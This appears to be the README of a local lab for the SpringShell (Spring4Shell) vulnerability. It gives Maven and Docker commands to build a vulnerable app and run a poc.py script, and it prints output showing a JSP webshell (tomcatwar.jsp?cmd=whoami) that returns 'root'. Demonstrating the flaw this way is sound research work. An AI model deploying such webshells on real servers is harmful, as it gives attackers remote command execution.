# SpringShell

## Deploy

`mvn package` -> Will create .war file
`docker build . -t spring` -> Will create docker image
`docker run --rm -d -p 8080:8080 --name spring spring:latest` -> Will create container
`docker build . -t spring && docker run --rm -d -p 8080:8080 --name spring spring:latest && sleep 5 && python3 poc.py` -> Will create container and execute PoC

## Results:
`docker logs -f <container_id>` or `docker logs -f (docker ps -a -q)`

```
deploy <Response [200]>
webshell <Response [404]>
webshell <Response [500]>
webshell http://localhost:8080/tomcatwar.jsp?cmd=whoami
root
```

## Info:
https://github.com/rive-n/SpringShell/blob/master/exploit.pdf
